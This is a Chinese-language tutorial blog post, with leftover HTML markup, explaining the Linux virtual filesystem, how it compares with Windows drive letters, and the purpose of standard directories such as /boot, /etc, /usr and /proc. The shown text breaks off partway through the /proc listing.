系统中的一切都是存放在唯一的 虚拟文件系统中的，这个 虚拟文件系统是树状的结构以一个根目录开始。启动系统后，先有这个 虚拟文件系统，再识别出各个硬盘， 再把某个硬盘的某个分区挂载到这个 虚拟文件系统的某个子树上（即分区用某个子目录来表示），再确定分区对应的子目录文件系统，最后的文件就存放在这个特定的文件系统中。 也就是说， Linux 系统是通过 <strong>“虚拟文件系统-硬盘-硬盘上的分区-分区上的特定文件系统-特定文件系统中的文件”</strong> 这样的顺序来访问一个文件的。</p>\n<p>可能对习惯了使用Windows的用户来说， Linux 的方式有些不适应，它的 虚拟文件系统，实质就是一颗目录树，最开始的目录叫做根目录，根目录中又有每一级子目录，或者文件，子目录又有子子目录和文件，其中每个子目录都特定的功能这个功能（这些是约定俗成了的，在后面 常用的重要目录 (See section 1.2.1) 中会详细说明）。</p>\n<p>也许有人会问，没有这个虚拟文件系统就无法使用硬盘，可是最开始没有硬盘，那么这个 虚拟文件系统以及相应的组织结构是怎么存放起来的呢？这个问题，就像先有鸡还是先有蛋这个问题一样看似简单实则……但是，在 Linux 中，很轻易地跳出了这个思维循环，问题的答案并没在 虚拟文件系统 和 硬盘 这两者之间徘徊，而是第三者—— 内存 ，Linux系统启动起来之后，整个 虚拟文件系统的组织结构，都是随着每次内核系统的启动自动在内存中建立好了的，根本就不需要硬盘。</p>\n<p>另外还要注意，就是在我们用户的角度上，无论在Windows还是 Linux 上面，都是使用路径来访问一个文件的。表示文件的路径由 <strong>“文件所在的目录+各级目录的分隔符+文件”</strong> 三个部分组成，这个策略在两者之间是一样的，所不同的是，Windows下面目录分隔符是 \\ ， Linux 下面是 / ，也许这也是两者之间为了表示其各自立场不同的一个原因吧？^_^</p>\n<h3>系统组织</h3>\n<p>在Windows系统中，我们可以把文件大体分为两种： <strong>系统文件和用户文件</strong> 。一般来说系统文件（例如Windows操作系统本身，一些系统程序，程序运行所需的库文件，以及一些系统配置文件等）存放的默认位置在 C 盘，当然也可以在安装时候指定在其他盘；其它用户文件，包含用户后来安装的程序以及一些数据文件等，用户可以把它们随意存放在任意的分区。</p>\n<p>在 Linux 系统中，主要有两个概念： 虚拟文件系统中的文件和 Linux操作系统内核 本身。逻辑上可以认为前者属于上层，后者在下层，前者基于后者，后者依赖前者而存在。 Linux 把除了它本身（ Linux操作系统内核 ）以外的一切事物都看作是在 虚拟文件系统中的文件了。无论是键盘，鼠标，数据，程序，CPU，内存，网卡……无论是硬件、软件、数据还是内存中的东西，我们都可以在 虚拟文件系统中的相应子目录对他们进行访问和操作，操作统一。而实现这些管理的幕后就是 Linux操作系统内核 本身：启动 Linux 系统的时候，首先电脑把 Linux操作系统内核 加载到内存中，内核本身提供了文件管理，设备管理，内存管理，CPU进程调度管理，网络管理等功能，等内核运行起来之后，就在内存中建立起相应的 虚拟文件系统，最后就是内核利用它提供的那些功能，通过管理文件的方式，来管理 虚拟文件系统中的硬件软件等各种资源了。</p>\n<p>Linux 把提供操作系统本身功能（管理计算机软硬件资源）的那些部分划给了 Linux操作系统内核 ，使得Linux操作系统内核 成为一个独立的部分，有它自己独立的开源代码；而其它的一切（软件应用，硬件驱动，数据）都根据其特性有自己的开源代码、或者自由地组织并且存放在那个 虚拟文件系统中由 Linux操作系统内核 来管理。这样，将系统本身和系统所管理的资源分开，并开放源代码，有助于对系统或者系统所管理的资源进行灵活的定制和扩展，还能按需快速建立起只适合自己使用的操作系统，也利于操作系统本身的发展。实际 Ubuntu ， Fedora ， RedHat 等各种不同的 Linux 操作系统发行版，简单来说就是不同厂商对其文件系统和内核进行了不同的配置而产生的 <strong>“大众化”</strong> 的操作系统。相比之下，Windows就显得非常地零乱复杂，将系统、软件、硬件、数据都混在了一起，其不同版本只能由Microsoft 一家公司发行。</p>\n<h3>举例说明</h3>\n<p>下面用直观的例子，来说明两者的不同，以加深理解。假设我们的机器上面有一个硬盘，硬盘分为三个区。</p>\n<p>在Windows系统中， 我们启动系统之后就会看到 C, D, E, 盘符，它们分别对应硬盘上的三个分区，增加硬盘，或者分区，会导致盘符的增加（注意由于历史原因， A, B 用于表示软驱，硬盘分区盘符从 C 开始按字母递增），这里的每个分区都各自可以被格式化为不同的文件系统（这里的文件系统，包括例如 NTFS 格式， FAT32 格式等)，文件系统的基本功能就是为了存放文件的，不同文件系统区别一般在于管理其中存放的文件的功能的强弱，所以分区被格式化成指定格式的文件系统之后，就可以存放任何文件和目录了，我们看到的 C, D, E 内容也就对应了硬盘中相应分区的数据内容。</p>\n<p>但是，与Windows中把硬盘分区看成 C, D, E 盘符不同， Linux 中最开始根本就没有硬盘的概念，就只有一个纯粹的 虚拟文件系统。如果想要使用哪个硬盘的某个分区，就把那个分区 <strong>“挂载”</strong> 到某个子目录之下，这样硬盘中的分区，文件系统，目录等内容就呈现到了那个子目录里面。也就是说，在 Linux 中，我们使用硬盘中的数据，实际是先把硬盘的某个分区 <strong>“挂载”</strong> 到某个子目录下，然后通过那个子目录来访问的。这个例子中， 通常硬盘会对应 虚拟文件系统中的/dev/sda （如有多个硬盘，则为 /dev/sda, /dev/sdb, ……， 按字母递增）, 其三个分区对应 /dev/sda1, /dev/sda2,/dev/sda3 （多个分区按数字递增，不同硬盘的分区，对应为 /dev/sdb1, /dev/sdb2 等等）, 默认硬盘各个分区会被挂载到 虚拟文件系统系统中类似 /mnt/sda1/, /mnt/sda2/, /mnt/sda3/ 的目录（在 Linux 又叫挂载点）中，在/etc/fstab 文件中，我们可以找到分区文件和挂载点的对应关系描述。这样，硬盘相应的分区就做为整个 虚拟文件系统根目录下的一颗子树，反映到了子目录（挂载点）上，子目录中的内容就对应分区中的数据。</p>\n<p>假设访问上述硬盘第三个分区 dir1 目录中的文件 test.file</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a9d0d87dc1130387137\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nWindow系统上的路径：E:\\dir1\\test.file\r\nLinux系统上的路径：/mnt/sda3/dir1/test.file</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87dc1130387137-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87dc1130387137-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87dc1130387137-1\"><span class=\"crayon-i\">Window</span>系统上的路径：<span class=\"crayon-v\">E</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">dir1</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-v\">test</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">file</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87dc1130387137-2\"><span class=\"crayon-i\">Linux</span>系统上的路径：<span class=\"crayon-o\">/</span><span class=\"crayon-v\">mnt</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sda3</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dir1</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">test</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">file</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p>再有，假设用户安装和卸载一个程序 firefox ：</p>\n<ul>\n<li>Windows系统中指定或不指定安装路径类似，程序的安装目录会在 C:\\Program Files\\Firefox 类似的目录中，或指定的安装路径中； 可执行文件一般在程序的安装路径；依赖的内部库、第三方库、和系统库可能在安装路径中，也可能在C:\\Windows\\System32, 或 C:\\Windows\\system 等类似的路径；而程序访问期间的系统和用户配置文件和产生的输入输出文件，可能会在安装路径配置中，或者在 C:\\Windows\\ 下的某些文件中（比如注册表数据库文件、用户目录等），这就不一定了。而且不同的系统版本，应用程序版本下，这些目录的具体名称和路径可能会有所不同。卸载的时候由于不确定哪些地方安装了什么内容，很容易造成文件删除补全，遗留系统垃圾等现象，造成系统越来越瘫肿。</li>\n<li>Linux 系统中如果不指定安装路径，所有程序的可执行文件在 /usr/bin 中， 全局配置文件在 /etc/firefox 类似的目录， 用户配置文件一般在用户主目录的 .firefox 的路径下(用户主目录路径名称统一格式为 /home/&lt;username&gt;) ，依赖的内部库和第三方库在 /usr/lib, 系统库在 /lib 下， 数据文件一般就在用户主目录下。 如果指定安装目录，那么所有内部库和可执行程序，全局配置文件，会在 &lt;安装路径&gt; 下的 bin, lib, etc 子目录下，其它文件一般和默认情况相同。卸载程序之时，只需在对应目录中，将可执行文件、内部库、配置文件、数据文件删除即可，基本没有不确定是否遗留垃圾文件的问题。这些都是大多数应用程序安装的和访问的默认策略，就像是不成文的业界标准，不排除有个别程序不安装这种策略部署应用，但是 Linux 用户带来 “麻烦“ 的应用，早晚也会被淘汰，不可能会流行在 Linux 系统中，这样，自然的，好的应用都保存在 Linux 系统中并逐渐流行起来，还不会破坏系统结构。</li>\n</ul>\n<p>可见， Linux 文件的存放和组织明显方式更高效，层次更分明。</p>\n<h3>优缺点</h3>\n<p>基于上述内容，Windows和 Linux 文件系统的各有优缺点分别如下。</p>\n<ul>\n<li>Windows系统优点优点主要是用户存放东西的位置比较自由，系统结构简单便于新用户上手。</li>\n<li>Windows系统缺点缺点较多主要有：\n<ul>\n<li>目录组织缺乏标准由于对“系统文件”和“用户文件”存放位置缺乏细致的规定，数据组织的方式显得比较凌乱，并且两种文件之间很容易相互干扰（例如数据文件可能存放在系统区域给系统带来垃圾文件等）。</li>\n<li>用户的使用经验对系统的使用效率影响很大一般来说，我们使用Windows时候合理使用分区会提升的系统效率。例如根据需要设置合理的系统分区（假设为C 分区），尽量少往 C 盘存放数据文件，根据具体情况可以将一些 <strong>“重要并且常用的”</strong> 程序安装在 C 分区，随时保持系统目录的清洁和大小助于提升系统的运行速度，用户安装的一般软件尽量不要安装在 C 盘，安装软件时候指定的位置最好采用默认标准目录名称（例如 X:\\Program Files 目录，这里 X 表示盘符而不要自己定义一些奇怪名字的目录，这样便于软件的维护等等。</li>\n<li>共享不便Windows上有经验的用户们会将自己的目录结构组织好，但是每个用户组织自己内容的方式是不一样的，所以他的机器上哪里存放了什么内容，别人很难知道，为共享带来了麻烦。</li>\n</ul>\n</li>\n<li>Linux 系统缺点最开始 虚拟文件系统中的每个子目录的功能是事先规定好了的，我们需要事先知道那些目录存放哪些文件，然后在相应的位置中创建自己的内容，这也是 Linux 系统入门门槛高的一个原因。当然，最开始的新手，也完全可以无视这一点，可以像Windows那样随意地创建目录和文件（尽管不推荐这么做）。\n<p>实际上最开始的目录也不多，主要就那么几个，花不了多长时间就会明白它们的作用的，而明白这些作用之后带来的好处，远不止付出那么多（本文后面 常用的重要目录 (See section 1.2.1) 会着重对此进行介绍）。</p></li>\n<li>Linux 系统优点这里只说几个优点：\n<ul>\n<li>目录结构反映系统运行机理当我们了解了这些目录的功能之后，我们对整个 Linux 操作系统的运行机理也会有一个大致的了解。</li>\n<li>结构清晰避免逻辑混乱这样的目录结构，有助于我们以一种高效的方式组织自己的数据，分类清晰并且不会对系统运行有任何影响，规定了最开始每个目录的功能，并没有限制我们的自由，因为我们知道我们可以在哪里创建自己的子目录并且在子目录中任意创建自己的文件。</li>\n<li>组织规范便于共享由于目录具有统一的组织结构，所以 Linux 上面的用户在共享数据的时候，能够很容易地猜测出他所需要的数据大致存放在什么位置，同时也不会影响到私有数据的保密性，毕竟具体来说，怎么存放自己的私有数据，那是用户自己决定的。</li>\n</ul>\n</li>\n</ul>\n<h2>Linux 上面的虚拟文件系统目录组织</h2>\n<p>实质上，我们启动系统所看到的 <strong>“根目录”</strong> ，逻辑上是 Linux 虚拟文件系统的根目录中的一个子目录，我们看不到除了这个 <strong>“根目录”</strong> 以外的其他的目录，那些目录和操作系统的具体实现相关是被操作系统内核隐藏起来了的，所以这里就介绍我们所能看到的文件系统中的 <strong>“根目录”</strong> 的各个子目录中的作用吧。</p>\n<p>在 Linux 文件系统中的每一个子目录都有特定的目的和用途。一般都是根据 FHS 标准定义一个正式的文件系统结构的，这个标准规定了哪些目录应该哪些作用。这里我们先介绍一些日常经常用到的目录，然后给出 FHS 相关的内容。</p>\n<h3>常用的重要目录</h3>\n<p>这里，根据本人的使用经验，给出比较常见重要的一些目录，最开始我们对它们有所了解就可以了。随着对 Linux 使用的经验的加深，我们会了解越来越多的目录。对目录的功能知道得越多，我们对 Linux 系统的工p作原理就理解的越深刻，理解操作系统的工作原理，更助于我们更为规范地使用和理解系统中每个目录存在的意义，直至最后几乎知道系统中的每个文件……</p>\n<ul>\n<li>/ 根目录包含了几乎所的文件目录。相当于中央系统。进入的最简单方法是：cd /。</li>\n<li>/boot 引导程序，内核等存放的目录这个目录，包括了在引导过程中所必需的文件，引导程序的相关文件（例如 grub ， lilo 以及相应的配置文件）以及 Linux 操作系统内核相关文件（例如 vmlinuz 等）一般都存放在这里。在最开始的启动阶段，通过引导程序将内核加载到内存，完成内核的启动（这个时候， 虚拟文件系统还不存在，加载的内核虽然是从硬盘读取的，但是没经过 Linux 的 虚拟文件系统，这是比较底层的东西来实现的）。然后内核自己创建好 虚拟文件系统，并且从 虚拟文件系统的其他子目录中（例如 /sbin 和 /etc ）加载需要在开机启动的其他程序或者服务或者特定的动作（部分可以由用户自己在相应的目录中修改相应的文件来配制）。如果我们的机器中包含多个操作系统，那么可以通过修改这个目录中的某个配置文件（例如 grub.conf ）来调整启动的默认操作系统，系统启动的择菜单，以及启动延迟等参数。</li>\n<li>/sbin 超级用户可以使用的命令的存放目录存放大多涉及系统管理的命令（例如引导系统的 init 程序），是超级权限用户 root 的可执行命令存放地，普通用户无权限执行这个目录下的命令（但是有时普通用户也可能会用到）。这个目录和 /usr/sbin ,/usr/X11R6/sbin或/usr/local/sbin 等目录是相似的，我们要记住，凡是目录 sbin 中包含的都是 root 权限才能执行的，这样就行了。后面会具体区分。</li>\n<li>/bin 普通用户可以使用的命令的存放目录系统所需要的那些命令位于此目录，比如 ls 、 cp 、 mkdir 等命令；类似的目录还 /usr/bin ， /usr/local/bin等等。这个目录中的文件都是可执行的、普通用户都可以使用的命令。作为基础系统所需要的最基础的命令就是放在这里。</li>\n<li>/lib 根目录下的所程序的共享库目录此目录下包含系统引导和在根用户执行命令时候所必需用到的共享库。做个不太好但是比较形象的比喻，点类似于Windows上面的 system32 目录。按理说，这里存放的文件应该是 /bin 目录下程序所需要的库文件的存放地，也不排除一些例外的情况。类似的目录还 /usr/lib ， /usr/local/lib 等等。</li>\n<li>/dev 设备文件目录在 Linux 中设备都是以文件形式出现，这里的设备可以是硬盘，键盘，鼠标，网卡，终端，等设备，通过访问这些文件可以访问到相应的设备。设备文件可以使用 mknod 命令来创建，具体参见相应的命令；而为了将对这些设备文件的访问转化为对设备的访问，需要向相应的设备提供设备驱动模块（一般将设备驱动编译之后，生成的结果是一个*.ko 类型的二进制文件），在内核启动之后，再通过 insmod 等命令加载相应的设备驱动之后，我们就可以通过设备文件来访问设备了。一般来说，想要 Linux 系统支持某个设备，只需要三个东西：相应的硬件设备，支持硬件的驱动模块，以及相应的设备文件。</li>\n<li>/home 普通用户的家目录（或 $HOME 目录、主目录）在 Linux 机器上，用户主目录通常直接或间接地置在此目录下。其结构通常由本地机的管理员来决定。通常而言，系统的每个用户都有自己的家目录，目录以用户名作为名字存放在 /home 下面（例如 quietheart 用户，其家目录的名字为 /home/quietheart ）。该目录中保存了绝大多数的用户文件(用户自己的配置文件，定制文件，文档，数据等)， root 用户除外（参见后面的 /root 目录）。由于这个目录包含了用户实际的数据，通常系统管理员为这个目录单独挂载一个独立的磁盘分区，这样这个目录的文件系统格式就可能和其他目录不一样了（尽管表面上看，这个目录还是属于根目录的一棵子树上），将系统文件和数据文件分开存放，有利于维护。</li>\n<li>/root 用户root的 $HOME 目录系统管理员(就是 root 用户或超级用户)的主目录比较特殊，不存放在 /home 中，而是直接放在 /root 目录下了。</li>\n<li>/etc 全局的配置文件存放目录系统和程序一般都可以通过修改相应的配置文件，来进行配置。例如，要配置系统开机的时候启动那些程序，配置某个程序启动的时候显示什么样的风格等等。通常这些配置文件都集中存放在 /etc 目录中，所以想要配置什么东西的话，可以在 /etc 下面寻找我们可能需要修改的文件。一些大型套件，如 X11 ，在 /etc 下它们自己的子目录。系统配置文件可以放在这里或在 /usr/etc 。 不过所有程序总是在 /etc 目录下查找所需的配置文件，你也可以将这些文件链接到目录 /usr/etc 。另外，还一个需要注意的常见现象就是，当某个程序在某个用户下运行的时候，可能会在该用户的家目录中生成一个配置文件（一般这个文件最开始就是 /etc 下相应配置文件的拷贝，存放相应于“当前用户”的配置），这样当前用户可以通过配置这个家目录的配置文件，来改变程序的行为，并且这个行为只是该用户特有的。原因就是：一般来说一个程序启动，如果需要读取一些配置文件的话，它会首先读取当前用户家目录的配置文件，如果存在就使用；如果不存在它就到 /etc 下读取全局的配置文件进而启动程序。就是这个配置文件不自动生成，我们手动在自己的家目录中创建一个文件的话，也有许多程序会首先读取到这个家目录的文件并且以它的配置作为启动的选项（例如我们可以在家目录中创建 vim 程序的配置文件 .vimrc ，来配置自己的 vim 程序）。</li>\n<li>/usr 这个目录中包含了命令库文件和在通常操作中不会修改的文件这个目录对于系统来说也是一个非常重要的目录，其地位类似Windows上面的 Program Files 目录（请原谅我可能这样做比较不太恰当^_^）。安装程序的时候，默认就是安装在此文件内部某个子文件夹内。输入命令后系统默认执行 /usr/bin 下的程序（当然，前提是这个目录的路径已经被添加到了系统的环境变量中）。此目录通常也会挂载一个独立的磁盘分区，它应保存共享只读类文件，这样它可以被运行 Linux 的不同主机挂载。</li>\n<li>/usr/lib 目标库文件，包括动态连接库加上一些通常不是直接调用的可执行文件的存放位置这个目录功能类似 /lib 目录，理说，这里存放的文件应该是 /bin 目录下程序所需要的库文件的存放地，也不排除一些例外的情况。</li>\n<li>/usr/bin 一般使用者使用并且不是系统自检等所必需可执行文件的目录此目录相当于根文件系统下的对应目录（ /bin ），非启动系统，非修复系统以及非本地安装的程序一般都放在此目录下。</li>\n<li>/usr/sbin 管理员使用的非系统必须的可执行文件存放目录此目录相当于根文件系统下的对应目录（ /sbin ），保存系统管理程序的二进制文件，并且这些文件不是系统启动或文件系统挂载 /usr 目录或修复系统所必需的。</li>\n<li>/usr/share 存放共享文件的目录在此目录下不同的子目录中保存了同一个操作系统在不同构架下工作时特定应用程序的共享数据(例如程序文档信息)。使用者可以找到通常放在 /usr/doc 或 /usr/lib 或 /usr/man 目录下的这些类似数据。</li>\n<li>/usr/include C程序语言编译使用的头文件Linux 下开发和编译应用程序所需要的头文件一般都存放在这里，通过头文件来使用某些库函数。默认来说这个路径被添加到了环境变量中，这样编译开发程序的时候编译器会自动搜索这个路径，从中找到你的程序中可能包含的头文件。</li>\n<li>/usr/local 安装本地程序的一般默认路径当我们下载一个程序源代码，编译并且安装的时候，如果不特别指定安装的程序路径，那么默认会将程序相关的文件安装到这个目录的对应目录下。例如，安装的程序可执行文件被安装（安装实质就是复制）到了 /usr/local/bin 下面，此程序（可执行文件）所需要依赖的库文件被安装到了 /usr/local/lib 目录下，被安装的软件如果是某个开发库（例如 Qt ， Gtk 等）那么相应的头文件可能就被安装到了 /usr/local/include 中等等。也就是说，这个目录存放的内容，一般都是我们后来自己安装的软件的默认路径，如果择了这个默认路径作为软件的安装路径，被安装的软件的所文件都限制在这个目录中，其中的子目录就相应于根目录的子目录。</li>\n<li>/proc 特殊文件目录这个目录采用一种特殊的文件系统格式（ proc 格式），内核支持这种格式。其中包含了全部虚拟文件。它们并不保存在磁盘中，也不占据磁盘空间(尽管命令 ls -c 会显示它们的大小)。当您查看它们时，您实际上看到的是内存里的信息，这些文件助于我们了解系统内部信息。例如：<br>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a9d0d87ddb102411476\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n├1/ 关于进程1的信息目录。每个进程在/proc 下一个名为其进程号的目录。\r\n├cpuinfo 处理器信息，如类型、制造商、型号和性能。\r\n├devices 当前运行的核心配置的设备驱动的列表。\r\n├dma 显示当前使用的DMA通道。\r\n├filesystems 核心配置的文件系统。\r\n├interrupts 显示使用的中断，and how many of each there have been.\r\n├ioports 当前使用的I/O端口。\r\n├kcore 系统物理内存映象。与物理内存大小一样，但实际不占这么多内存；\r\n├kmsg 核心输出的消息。也被送到syslog 。\r\n├ksyms 核心符号表。\r\n├loadavg 系统”平均负载”；3个没意义的指示器指出系统当前的工作量。\r\n├meminfo 存储器使用信息，包括物理内存和swap。\r\n├modules 当前加载了哪些核心模块。\r\n├net 网络协议状态信息。\r\n├self 到查看/proc 的程序的进程目录的符号连接。\r\n├stat 系统的不同状态\r\n├uptime 系统启动的时间长度。\r\n└version 核心版本。</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a9d0d87ddb102411476-18\">18</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87ddb102411476-1\">├<span class=\"crayon-cn\">1</span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span>关于进程<span class=\"crayon-cn\">1</span>的信息目录。每个进程在<span class=\"crayon-o\">/</span><span class=\"crayon-i\">proc</span><span class=\"crayon-h\"> </span>下一个名为其进程号的目录。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87ddb102411476-2\">├<span class=\"crayon-i\">cpuinfo</span><span class=\"crayon-h\"> </span>处理器信息，如类型、制造商、型号和性能。</div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87ddb102411476-3\">├<span class=\"crayon-i\">devices</span><span class=\"crayon-h\"> </span>当前运行的核心配置的设备驱动的列表。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87ddb102411476-4\">├<span class=\"crayon-i\">dma</span><span class=\"crayon-h\"> </span>显示当前使用的<span class=\"crayon-i\">DMA</span>通道。</div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87ddb102411476-5\">├<span class=\"crayon-i\">filesystems</span><span class=\"crayon-h\"> </span>核心配置的文件系统。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87ddb102411476-6\">├<span class=\"crayon-i\">interrupts</span><span class=\"crayon-h\"> </span>显示使用的中断，<span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">how </span><span class=\"crayon-e\">many </span><span class=\"crayon-e\">of </span><span class=\"crayon-st\">each</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">there </span><span class=\"crayon-e\">have </span><span class=\"crayon-v\">been</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87ddb102411476-7\">├<span class=\"crayon-i\">ioports</span><span class=\"crayon-h\"> </span>当前使用的<span class=\"crayon-v\">I</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">O</span>端口。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87ddb102411476-8\">├<span class=\"crayon-i\">kcore</span><span class=\"crayon-h\"> </span>系统物理内存映象。与物理内存大小一样，但实际不占这么多内存；</div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87ddb102411476-9\">├<span class=\"crayon-i\">kmsg</span><span class=\"crayon-h\"> </span>核心输出的消息。也被送到<span class=\"crayon-i\">syslog</span><span class=\"crayon-h\"> </span>。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a9d0d87ddb102411476-10\">├<span class=\"crayon-i\">ksyms</span><span class=\"crayon-h\"> </span>核心符号表。</div><div class=\"crayon-line\" id=\"crayon-5b4a9d0d87ddb102411476-11\">├<span class=\"crayon-i\">loadavg</span><span class=\"crayon-h\"> </span>系统”平均负载”；<span class=\"crayon-cn\">3</span>个没意义的指示器指出系统当前的工作量。</div><div class=\"crayon-line crayon-striped-line\" 